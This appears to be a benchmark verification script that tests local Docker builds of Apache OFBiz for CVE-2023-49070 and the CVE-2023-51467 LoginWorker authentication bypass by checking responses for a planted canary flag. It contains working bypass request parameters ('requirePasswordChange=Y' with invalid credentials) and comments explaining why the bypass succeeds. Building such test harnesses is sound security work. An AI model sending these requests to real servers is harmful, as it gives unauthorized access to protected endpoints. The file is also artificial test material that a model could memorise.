#!/usr/bin/env bash
# verify.sh --seed|--residual — apache-ofbiz-cve-2023-51467
# （CVE-2023-49070 seed / CVE-2023-51467 residual，LoginWorker 认证绕过，CWE-306）。
#
# 机制（oracle_variant=sibling：seed 与 residual 是不同 sink）：
#   seed     = /webtools/control/xmlrpc request-map 存在性：
#              V0(pre-49070, 7935a146) 端点 LIVE（响应无 'Unknown request' marker）；
#              V1(18.12.10, c59336f6) 49070 修复删除 request-map -> 控制器错误页
#              'Unknown request [xmlrpc]'。
#              xmlrpc 本身不携带 flag。V0 上 xmlrpc LIVE 之后，再读已有的
#              /pcbcanary/control/flag（同一 LoginWorker 门 + requirePasswordChange=Y）
#              把 RUN_FLAG 放进效果通道，供 wrong/stale 拒绝。不是新 harness。
#   residual = LoginWorker.checkLogin 认证绕过：requirePasswordChange=Y + 非空无效凭证 ->
#              18.12.10 login() 失败分支返回 "requirePasswordChange"（而非 "error"）
#              -> checkLogin 三个拒绝条件全 false -> 落回 "success" -> auth="true" 的
#              /pcbcanary/control/flag 对未认证者吐出 ${PCB_FLAG}。
#              V2(18.12.11, 1dcfa071) 修复后返回 "error" -> flag 被拒。
# 效果通道 = HTTP(S) 响应 body（canary groovy 事件写 "PCB_AUTHVIEW_OK\n<FLAG>"）。
# flag 通道 = canary 类（容器 boot 时 CMD 把 ${PCB_FLAG} bake 进
#             plugins/pcbcanary/groovyScripts/Flag.groovy，服务端种入）。
# 判定基准 = seed 先看 'Unknown request'，LIVE 时再看 RUN_FLAG；residual 看 RUN_FLAG。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# Prefer the real OFBiz HTTPS connector (:8443, public PoC / original gate).
# Fall back to HTTP :8080 (canary https="false"; host map is PORT_*:8080).
resolve_port() {
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$VERSION" "$1" 2>/dev/null | sed -n 's/^.*://p' | tr -d '[:space:]' | head -1
}
PORT8443="$(resolve_port 8443)"
PORT8080="$(resolve_port 8080)"
if [[ -n "$PORT8443" ]]; then
  PORT="$PORT8443"
  SCHEME="https"
elif [[ -n "$PORT8080" ]]; then
  PORT="$PORT8080"
  SCHEME="http"
else
  echo "cannot resolve ofbiz port for $VERSION" >&2
  exit 20
fi

pcb_probe() {
  local path="$1" query="$2"
  PCB_PORT="$PORT" PCB_SCHEME="$SCHEME" PCB_PATH="$path" PCB_QUERY="$query" \
  "$PY" - <<'PYEOF'
import os, ssl, sys, time, urllib.error, urllib.request
port = os.environ["PCB_PORT"]
scheme = os.environ.get("PCB_SCHEME", "https")
path = os.environ["PCB_PATH"]
query = os.environ.get("PCB_QUERY", "")
url = "%s://127.0.0.1:%s%s" % (scheme, port, path)
if query:
    url += "?" + query
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
if scheme == "https":
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
else:
    opener = urllib.request.build_opener()
last = ""
for _ in range(30):
    try:
        with opener.open(url, timeout=20) as r:
            body = r.read(20000).decode("utf-8", "replace")
        print(body[:3000])
        sys.exit(0)
    except urllib.error.HTTPError as e:
        body = e.read(20000).decode("utf-8", "replace")
        print(body[:3000])
        sys.exit(0)
    except Exception as e:
        last = "<request-error: %s: %s>" % (type(e).__name__, e)
        time.sleep(10)
print(last)
sys.exit(1)
PYEOF
}

if [[ "$MODE" == "--seed" ]]; then
  # seed：CVE-2023-49070 XML-RPC request-map（附带 bypass 参数，V0 上可到达 handler）
  OUT="$(pcb_probe "/webtools/control/xmlrpc" "USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y")"
  RC=$?
  if [[ $RC -ne 0 ]]; then echo "$OUT" >&2; exit 20; fi
  echo "$OUT" | head -c 600; echo
  if grep -q "Unknown request" <<<"$OUT"; then
    exit 10
  fi
  # xmlrpc LIVE — read RUN_FLAG from the existing LoginWorker-gated canary
  OUT="$(pcb_probe "/pcbcanary/control/flag" "USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y")"
  RC=$?
  if [[ $RC -ne 0 ]]; then echo "$OUT" >&2; exit 20; fi
  echo "$OUT" | head -c 600; echo
  if grep -qF "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
fi

# residual：CVE-2023-51467 auth bypass 打 auth-gated canary（两个非空无效凭证向量）
PATHS=("/pcbcanary/control/flag" "/pcbcanary/control/flag")
QUERIES=("USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y" \
         "USERNAME=nosuchuser&PASSWORD=nosuchpass&requirePasswordChange=Y")
BODY=""
for i in "${!PATHS[@]}"; do
  OUT="$(pcb_probe "${PATHS[$i]}" "${QUERIES[$i]}")"
  RC=$?
  if [[ $RC -ne 0 ]]; then echo "$OUT" >&2; exit 20; fi
  BODY="$OUT"
  if grep -qF "$RUN_FLAG" <<<"$OUT"; then
    break
  fi
done
echo "$BODY" | head -c 600; echo
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
